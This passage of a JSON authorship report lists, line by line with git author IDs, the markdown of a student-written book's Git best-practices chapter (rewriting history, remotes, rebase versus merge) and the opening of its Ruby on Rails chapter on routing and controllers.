        "lineNumber": 213,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 214,
        "author": {
          "gitId": "-"
        },
        "content": "---"
      },
      {
        "lineNumber": 215,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 216,
        "author": {
          "gitId": "-"
        },
        "content": "## Hide the Sausage Making"
      },
      {
        "lineNumber": 217,
        "author": {
          "gitId": "-"
        },
        "content": "_Sausage making_ refers to the process by which code is incrementally worked on, where a series of commits (like links in a sausage) make up a branch. It is often desirable to _hide the sausage making_ where the commit history is cleaned up so that it looks neater and is easier to follow."
      },
      {
        "lineNumber": 218,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 219,
        "author": {
          "gitId": "-"
        },
        "content": "When working on a `feature`/`fix` branch, you may:"
      },
      {
        "lineNumber": 220,
        "author": {
          "gitId": "-"
        },
        "content": "- [commit non-functioning code](#always-commit-functional-code), or"
      },
      {
        "lineNumber": 221,
        "author": {
          "gitId": "-"
        },
        "content": "- may need [multiple commits to implement one logical change in code](#one-logical-change-to-one-commit), or"
      },
      {
        "lineNumber": 222,
        "author": {
          "gitId": "-"
        },
        "content": "- cherry-pick a lot of commits from other branches"
      },
      {
        "lineNumber": 223,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 224,
        "author": {
          "gitId": "-"
        },
        "content": "This may clutter your history with low-level details or make it convoluted to follow for a maintainer or reviewer. Like sausage, you may enjoy eating it but not the process of making it."
      },
      {
        "lineNumber": 225,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 226,
        "author": {
          "gitId": "-"
        },
        "content": "### How to Hide the Sausage Making"
      },
      {
        "lineNumber": 227,
        "author": {
          "gitId": "-"
        },
        "content": "Hiding the sausage is typically achieved by either/both:"
      },
      {
        "lineNumber": 228,
        "author": {
          "gitId": "-"
        },
        "content": "- performing an interactive rebase, i.e. `git rebase -i`"
      },
      {
        "lineNumber": 229,
        "author": {
          "gitId": "-"
        },
        "content": "- patch-wise reset and stage, i.e. `git reset -p` and `git add -p`"
      },
      {
        "lineNumber": 230,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 231,
        "author": {
          "gitId": "-"
        },
        "content": "Ensure that you do this _before_:"
      },
      {
        "lineNumber": 232,
        "author": {
          "gitId": "-"
        },
        "content": "- pushing to a remote repository [to respect the published history](#respect-published-history) and"
      },
      {
        "lineNumber": 233,
        "author": {
          "gitId": "-"
        },
        "content": "- performing any merges from other branches."
      },
      {
        "lineNumber": 234,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 235,
        "author": {
          "gitId": "-"
        },
        "content": "Read more:"
      },
      {
        "lineNumber": 236,
        "author": {
          "gitId": "-"
        },
        "content": "- [On Sausage Making](https://sethrobertson.github.io/GitBestPractices/#sausage)"
      },
      {
        "lineNumber": 237,
        "author": {
          "gitId": "-"
        },
        "content": "- [Git Tools - Rewriting History](https://git-scm.com/book/en/v2/Git-Tools-Rewriting-History) (great reference for how to actually do this, under _Changing Multiple Commit Messages_)"
      },
      {
        "lineNumber": 238,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 239,
        "author": {
          "gitId": "-"
        },
        "content": "---"
      },
      {
        "lineNumber": 240,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 241,
        "author": {
          "gitId": "-"
        },
        "content": "## Respect Published History"
      },
      {
        "lineNumber": 242,
        "author": {
          "gitId": "-"
        },
        "content": "Always avoid rewriting the published history unless you are very sure of what you are doing, like:"
      },
      {
        "lineNumber": 243,
        "author": {
          "gitId": "-"
        },
        "content": "- You are working on your own branch that _no one else is using_, and"
      },
      {
        "lineNumber": 244,
        "author": {
          "gitId": "-"
        },
        "content": "    - you want to revert a commit without introducing another commit"
      },
      {
        "lineNumber": 245,
        "author": {
          "gitId": "-"
        },
        "content": "    - you are rebasing the branch"
      },
      {
        "lineNumber": 246,
        "author": {
          "gitId": "-"
        },
        "content": "    - you are [cleaning up the history of your branch](#hide-the-sausage-making)"
      },
      {
        "lineNumber": 247,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 248,
        "author": {
          "gitId": "-"
        },
        "content": "A failed `git push` usually means that your local branch is behind its remote counterpart, indicating that the local and remote branches have diverged."
      },
      {
        "lineNumber": 249,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 250,
        "author": {
          "gitId": "-"
        },
        "content": "```bash"
      },
      {
        "lineNumber": 251,
        "author": {
          "gitId": "-"
        },
        "content": "$ git push origin my-branch"
      },
      {
        "lineNumber": 252,
        "author": {
          "gitId": "-"
        },
        "content": "To git@github.com:foo/foo.git"
      },
      {
        "lineNumber": 253,
        "author": {
          "gitId": "-"
        },
        "content": " ! [rejected]        my-branch -\u003e my-branch (non-fast-forward)"
      },
      {
        "lineNumber": 254,
        "author": {
          "gitId": "-"
        },
        "content": "error: failed to push some refs to \u0027git@github.com:foo/foo.git\u0027"
      },
      {
        "lineNumber": 255,
        "author": {
          "gitId": "-"
        },
        "content": "hint: Updates were rejected because the tip of your current branch is behind"
      },
      {
        "lineNumber": 256,
        "author": {
          "gitId": "-"
        },
        "content": "hint: its remote counterpart. Integrate the remote changes (e.g."
      },
      {
        "lineNumber": 257,
        "author": {
          "gitId": "-"
        },
        "content": "hint: \u0027git pull ...\u0027) before pushing again."
      },
      {
        "lineNumber": 258,
        "author": {
          "gitId": "-"
        },
        "content": "hint: See the \u0027Note about fast-forwards\u0027 in \u0027git push --help\u0027 for details."
      },
      {
        "lineNumber": 259,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 260,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 261,
        "author": {
          "gitId": "-"
        },
        "content": "Alternatively, you may also see this when a branch diversion has occurred when you run `git status`."
      },
      {
        "lineNumber": 262,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 263,
        "author": {
          "gitId": "-"
        },
        "content": "```bash"
      },
      {
        "lineNumber": 264,
        "author": {
          "gitId": "-"
        },
        "content": "$ git status"
      },
      {
        "lineNumber": 265,
        "author": {
          "gitId": "-"
        },
        "content": "Your branch and \u0027origin/my-branch\u0027 have diverged,"
      },
      {
        "lineNumber": 266,
        "author": {
          "gitId": "-"
        },
        "content": "and have 3 and 5 different commit(s) each, respectively."
      },
      {
        "lineNumber": 267,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 268,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 269,
        "author": {
          "gitId": "-"
        },
        "content": "You can override this by [making a force push](https://stackoverflow.com/questions/10510462/force-git-push-to-overwrite-remote-files), i.e. `git push --force` but that would result in rewriting the published history or overwrite changes in the divergent remote commits. Observe the guidelines and ensure that the force push can be made in good faith with respect to your collaborators."
      },
      {
        "lineNumber": 270,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 271,
        "author": {
          "gitId": "-"
        },
        "content": "Read more:"
      },
      {
        "lineNumber": 272,
        "author": {
          "gitId": "-"
        },
        "content": "- [Rewriting History - Atlassian](https://www.atlassian.com/git/tutorials/rewriting-history)"
      },
      {
        "lineNumber": 273,
        "author": {
          "gitId": "-"
        },
        "content": "- [Don\u0027t change public history.](https://sethrobertson.github.io/GitBestPractices/#pubonce)"
      },
      {
        "lineNumber": 274,
        "author": {
          "gitId": "-"
        },
        "content": "- [Force \"git push\" to overwrite remote files - StackOverflow](https://stackoverflow.com/questions/10510462/force-git-push-to-overwrite-remote-files)"
      },
      {
        "lineNumber": 275,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 276,
        "author": {
          "gitId": "-"
        },
        "content": "---"
      },
      {
        "lineNumber": 277,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 278,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Keep up to Date"
      },
      {
        "lineNumber": 279,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Working With Remotes"
      },
      {
        "lineNumber": 280,
        "author": {
          "gitId": "-"
        },
        "content": "_Remotes_ refer to versions of the project you are working on that are hosted elsewhere, usually on the Internet. Remotes are very handy for managing collaboration, e.g. if you have to keep your code in sync with the `upstream` branch of the project, or if you need to pull code from someone else which may not be merged yet."
      },
      {
        "lineNumber": 281,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 282,
        "author": {
          "gitId": "-"
        },
        "content": "You can have as many remotes as you want, each possibly being read-only or with read/write privileges."
      },
      {
        "lineNumber": 283,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 284,
        "author": {
          "gitId": "-"
        },
        "content": "Remotes are managed using the `git remote` command."
      },
      {
        "lineNumber": 285,
        "author": {
          "gitId": "-"
        },
        "content": "```bash"
      },
      {
        "lineNumber": 286,
        "author": {
          "gitId": "-"
        },
        "content": "# view all remotes"
      },
      {
        "lineNumber": 287,
        "author": {
          "gitId": "-"
        },
        "content": "git remote -v"
      },
      {
        "lineNumber": 288,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 289,
        "author": {
          "gitId": "-"
        },
        "content": "# add a remote called \"upstream\" that points to https://github.com/TEAMMATES/teammates"
      },
      {
        "lineNumber": 290,
        "author": {
          "gitId": "-"
        },
        "content": "git remote add upstream https://github.com/TEAMMATES/teammates"
      },
      {
        "lineNumber": 291,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 292,
        "author": {
          "gitId": "-"
        },
        "content": "# branch off from the master branch of the upstream repository"
      },
      {
        "lineNumber": 293,
        "author": {
          "gitId": "-"
        },
        "content": "git fetch upstream # get data from upstream repo"
      },
      {
        "lineNumber": 294,
        "author": {
          "gitId": "-"
        },
        "content": "git checkout -b your-fancy-branch upstream/master # makes a new branch off the head of upstream/master"
      },
      {
        "lineNumber": 295,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 296,
        "author": {
          "gitId": "-"
        },
        "content": "# change the URL for the upstream remote from HTTPS to SSH"
      },
      {
        "lineNumber": 297,
        "author": {
          "gitId": "-"
        },
        "content": "git remote set-url upstream git@github.com:TEAMMATES/teammates.git"
      },
      {
        "lineNumber": 298,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 299,
        "author": {
          "gitId": "-"
        },
        "content": "# remove a remote named \"upstream\""
      },
      {
        "lineNumber": 300,
        "author": {
          "gitId": "-"
        },
        "content": "git remote remove upstream"
      },
      {
        "lineNumber": 301,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 302,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 303,
        "author": {
          "gitId": "-"
        },
        "content": "Read more:"
      },
      {
        "lineNumber": 304,
        "author": {
          "gitId": "-"
        },
        "content": "- [Git Basics - Working with Remotes](https://git-scm.com/book/en/v2/Git-Basics-Working-with-Remotes)"
      },
      {
        "lineNumber": 305,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 306,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Rebase Versus Merging"
      },
      {
        "lineNumber": 307,
        "author": {
          "gitId": "-"
        },
        "content": "| You should... | When ... |"
      },
      {
        "lineNumber": 308,
        "author": {
          "gitId": "-"
        },
        "content": "|---------------|----------|"
      },
      {
        "lineNumber": 309,
        "author": {
          "gitId": "-"
        },
        "content": "| merge | you created a branch to develop a feature, and now you want these changes to be inside `master` |"
      },
      {
        "lineNumber": 310,
        "author": {
          "gitId": "-"
        },
        "content": "| rebase | you created a branch from `master` to develop a feature, and someone else pushed a change to `master` before you finished |"
      },
      {
        "lineNumber": 311,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 312,
        "author": {
          "gitId": "-"
        },
        "content": "It is generally considered good practice to rebase your feature branch onto whatever branch you\u0027re trying to patch _before_ you make the pull request, resolving any conflicts that arise. This:"
      },
      {
        "lineNumber": 313,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "- [keeps the history clear and linear](https://www.bitsnbites.eu/a-tidy-linear-git-history/)"
      },
      {
        "lineNumber": 314,
        "author": {
          "gitId": "-"
        },
        "content": "    - makes backtracking easier"
      },
      {
        "lineNumber": 315,
        "author": {
          "gitId": "-"
        },
        "content": "    - easy to follow history"
      },
      {
        "lineNumber": 316,
        "author": {
          "gitId": "-"
        },
        "content": "    - reverting/rolling back is much simpler"
      },
      {
        "lineNumber": 317,
        "author": {
          "gitId": "-"
        },
        "content": "    - you can use `git bisect` to find regressions on your branch easily without involving unrelated changes from `master`"
      },
      {
        "lineNumber": 318,
        "author": {
          "gitId": "-"
        },
        "content": "- ensures your changes are compatible with the head of the branch you\u0027re patching"
      },
      {
        "lineNumber": 319,
        "author": {
          "gitId": "-"
        },
        "content": "- makes reviewing/testing easier by [not including irrelevant code by merging](https://lwn.net/Articles/328436/)"
      },
      {
        "lineNumber": 320,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 321,
        "author": {
          "gitId": "-"
        },
        "content": "Read more:"
      },
      {
        "lineNumber": 322,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "- [A Tidy, Linear Git History](https://www.bitsnbites.eu/a-tidy-linear-git-history/) - this is an excellent article which has formed my opinion on rebase vs. merge"
      },
      {
        "lineNumber": 323,
        "author": {
          "gitId": "-"
        },
        "content": "- [Rebasing and merging: some git best practices](https://lwn.net/Articles/328436/) - the merging/rebase issue involving wisdom from the creator of `git`, Linus Torvalds"
      },
      {
        "lineNumber": 324,
        "author": {
          "gitId": "-"
        },
        "content": "- [Merging vs. Rebasing - Atlassian](https://www.atlassian.com/git/tutorials/merging-vs-rebasing)"
      },
      {
        "lineNumber": 325,
        "author": {
          "gitId": "-"
        },
        "content": "- [When do you use git rebase instead of git merge - StackOverflow](https://stackoverflow.com/questions/804115/when-do-you-use-git-rebase-instead-of-git-merge/804178#804178) - a discussion on when to rebase and when to merge"
      },
      {
        "lineNumber": 326,
        "author": {
          "gitId": "-"
        },
        "content": "---"
      },
      {
        "lineNumber": 327,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 328,
        "author": {
          "gitId": "-"
        },
        "content": "# Resources"
      },
      {
        "lineNumber": 329,
        "author": {
          "gitId": "-"
        },
        "content": "These are the resources used in the writing of this chapter, as well as any additional, interesting readings."
      },
      {
        "lineNumber": 330,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 331,
        "author": {
          "gitId": "-"
        },
        "content": "- [A Note About Git Commit Messages by Tim Pope](https://tbaggery.com/2008/04/19/a-note-about-git-commit-messages.html)"
      },
      {
        "lineNumber": 332,
        "author": {
          "gitId": "-"
        },
        "content": "- [Git Best Practices by Seth Robertson](https://sethrobertson.github.io/GitBestPractices/)"
      },
      {
        "lineNumber": 333,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "- [A Tidy, Linear Git History](https://www.bitsnbites.eu/a-tidy-linear-git-history/)"
      },
      {
        "lineNumber": 334,
        "author": {
          "gitId": "-"
        },
        "content": "- [Rebasing and merging: some git best practices](https://lwn.net/Articles/328436/) involves wisdom from Linus Torvalds"
      },
      {
        "lineNumber": 335,
        "author": {
          "gitId": "-"
        },
        "content": "- [Formats and Conventions: Commit Messages](https://oss-generic.github.io/process/docs/FormatsAndConventions.html#commit-message)"
      },
      {
        "lineNumber": 336,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 337,
        "author": {
          "gitId": "-"
        },
        "content": "- [programming practices - When to commit code?](https://softwareengineering.stackexchange.com/questions/83837/when-to-commit-code)"
      },
      {
        "lineNumber": 338,
        "author": {
          "gitId": "-"
        },
        "content": "- [When is a version control commit too large?](https://softwareengineering.stackexchange.com/questions/10793/when-is-a-version-control-commit-too-large)"
      },
      {
        "lineNumber": 339,
        "author": {
          "gitId": "-"
        },
        "content": "- [Commit only part of a file in Git](https://stackoverflow.com/questions/1085162/commit-only-part-of-a-file-in-git) this is useful to use as a cheatsheet during interactive staging"
      },
      {
        "lineNumber": 340,
        "author": {
          "gitId": "-"
        },
        "content": "- [When do you use git rebase instead of git merge - StackOverflow](https://stackoverflow.com/questions/804115/when-do-you-use-git-rebase-instead-of-git-merge/804178#804178)"
      },
      {
        "lineNumber": 341,
        "author": {
          "gitId": "-"
        },
        "content": "- [Force \"git push\" to overwrite remote files - StackOverflow](https://stackoverflow.com/questions/10510462/force-git-push-to-overwrite-remote-files)"
      },
      {
        "lineNumber": 342,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 343,
        "author": {
          "gitId": "-"
        },
        "content": "- [Git Tools - Rewriting History](https://git-scm.com/book/en/v2/Git-Tools-Rewriting-History)"
      },
      {
        "lineNumber": 344,
        "author": {
          "gitId": "-"
        },
        "content": "- [Git Basics - Working with Remotes](https://git-scm.com/book/en/v2/Git-Basics-Working-with-Remotes)"
      },
      {
        "lineNumber": 345,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 346,
        "author": {
          "gitId": "-"
        },
        "content": "- [git stash - Saving Changes | Atlassian Git Tutorial](https://www.atlassian.com/git/tutorials/git-stash)"
      },
      {
        "lineNumber": 347,
        "author": {
          "gitId": "-"
        },
        "content": "- [Merging vs. Rebasing - Atlassian](https://www.atlassian.com/git/tutorials/merging-vs-rebasing)"
      },
      {
        "lineNumber": 348,
        "author": {
          "gitId": "-"
        },
        "content": "- [Rewriting History - Atlassian](https://www.atlassian.com/git/tutorials/rewriting-history)"
      },
      {
        "lineNumber": 349,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 350,
        "author": {
          "gitId": "-"
        },
        "content": "## Further Reading"
      },
      {
        "lineNumber": 351,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "- [Git for Computer Scientists](https://eagain.net/articles/git-for-computer-scientists/) - discusses the underlying implementation of `git` (merkle tree)"
      },
      {
        "lineNumber": 352,
        "author": {
          "gitId": "-"
        },
        "content": "- [Pro Git](https://git-scm.com/book/en/v2)"
      },
      {
        "lineNumber": 353,
        "author": {
          "gitId": "-"
        },
        "content": "- [The most useful git commands](https://orga.cat/posts/most-useful-git-commands) - a reference sheet of some handy command macros"
      },
      {
        "lineNumber": 354,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 355,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 5,
      "jamessspanggg": 4,
      "-": 346
    }
  },
  {
    "path": "contents/ruby/Rails.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Ruby on Rails"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# Ruby on Rails"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cb\u003e Authors: [Chattoraj Ayush](https://github.com/AyushChatto) \u003c/b\u003e"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "-"
        },
        "content": "Reviewers: [Lu Yang Kenneth](https://github.com/luyangkenneth), [Marvin Chin](https://github.com/marvinchin)"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Ruby on Rails Overview"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "-"
        },
        "content": "**Ruby on Rails** is a web application framework written in the Ruby programming language. It was designed with the intention of making programming web applications easier and quicker by reducing the amount of code you write. Rails achieves this by being an \"opinionated framework\", which means that the developers believe that there is a certain approach - often called \"The Rails Way\" - that is ideal for building most types of web applications. By adhering to this approach, Rails allows you to focus primarily on the logic, and fills in much of the boilerplate code for you. "
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "-"
        },
        "content": "### The Rails Way "
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "-"
        },
        "content": "One of the core tenets of Rails is \"Convention over Configuration\", which means that many decisions regarding the structure of your Rails application are made for you in advance, so that there is less effort needed to come up with your own set of best practices. This is perhaps most evident in Rails\u0027 decision to follow a Model-View-Controller (MVC) architecture by default."
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "-"
        },
        "content": "Here\u0027s how a Rails application is structured:"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ccenter\u003e"
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cimg src\u003d\"mvc.jpeg\"\u003e"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": "_Figure 1. Model-View-Controller Framework_ \u003csup\u003e[source](https://medium.com/@matthewmain/rails-request-response-cycle-819e9cd8fa4e)\u003c/sup\u003e"
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/center\u003e"
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": "Let us follow the diagram, and trace the control flow as a Rails app responds to a request by the client. In this example, the client is making a query for all users in the database. "
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": "#### Router"
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": "When Rails receives the URL, it first looks up the "
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ctooltip effect\u003d\"scale\" content\u003d\"A URI (Uniform Resource Identifier) is a string of characters that are used to identify a resource. URLs are a subset of URIs.\"\u003e"
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ca href\u003d\"\"\u003eURI\u003c/a\u003e"
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/tooltip\u003e in the `routes.rb` file, which defines, by default, all the routes in the application. Each valid URI is mapped to a function located inside a Controller, that is then invoked to provide a response to the request. "
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": "In order to achieve this, Rails exposes a convenient abstraction called a \"Resource\". A resource can refer to an object upon which you can perform CRUD (create, read, update, and delete) operations. These operations are often invoked via a HTTP request of the appropriate request verb (POST, GET, PUT, and DELETE respectively). In order to declare a resource called `user`, you would mention it inside your `routes.rb` in the following manner: "
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": "```ruby"
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": "resources :users"
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": "Now, you can check all the routes that you have in your application by running `rails routes` in the command line. This should include:"
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": "    Prefix Verb   URI Pattern                          Controller#Action"
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "     users GET    /users(.:format)                     users#index"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": "           POST   /users(.:format)                     users#create"
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "  new_user GET    /users/new(.:format)                 users#new"
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": " edit_user GET    /users/:id/edit(.:format)            users#edit"
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "      user GET    /users/:id(.:format)                 users#show"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": "           PATCH  /users/:id(.:format)                 users#update"
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "           PUT    /users/:id(.:format)                 users#update"
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": "           DELETE /users/:id(.:format)                 users#destroy"
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": "As can be seen, the common routes that you would need for the resources have already been mapped to their respective URI\u0027s. This is equivalent to manually declaring the 7 resourceful routes for the `user` resource. By convention, Rails will then look for a controller called `users_controller.rb` and invoke the name of the function mapped to the particular URI and Verb. More information about Rails routes and how they work can be found [here](https://guides.rubyonrails.org/routing.html#resource-routing-the-rails-default)."
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": "#### Controller"
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": "In the standard Rails convention, once inside the application directory, if you navigate to `app/controllers/`, you should be able to see all the controllers in your project. Rails will look for the controller with the `\u003cname\u003e_controller.rb`, where `\u003cname\u003e` would be replaced by the result under the `Controller` heading in the list of routes above, in this case, `users`. It will then look for the function name under the `Action` heading mapped to the URI function inside the Controller, and then call it. For example, if someone makes a GET request to `/users`, Rails will then respond by calling the `users#index` controller action (refer to the code below). "
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": "```ruby"
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "class UsersController \u003c ApplicationController"
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": "  def index"
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": "    # implementation goes here"
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": "  end"
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": "end"
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ccenter\u003e"
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": "`users_controller.rb` \u003ci\u003ewith an \u003c/i\u003e`index` \u003ci\u003emethod\u003c/i\u003e "
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/center\u003e"
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
